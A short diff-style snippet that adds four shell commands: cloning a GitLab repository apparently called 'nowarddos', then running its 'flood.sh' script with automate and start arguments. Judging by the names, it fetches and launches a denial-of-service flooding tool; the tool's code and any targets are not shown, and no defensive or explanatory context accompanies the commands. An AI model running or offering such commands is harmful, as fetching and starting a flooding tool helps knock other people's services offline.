@@ -1,0 +1,4 @@
+git clone https://gitlab.com/a_gonda/nowarddos.git && 
+cd nowarddos/ && 
+./flood.sh automate 20 3 50 3 && 
+./flood.sh start 3
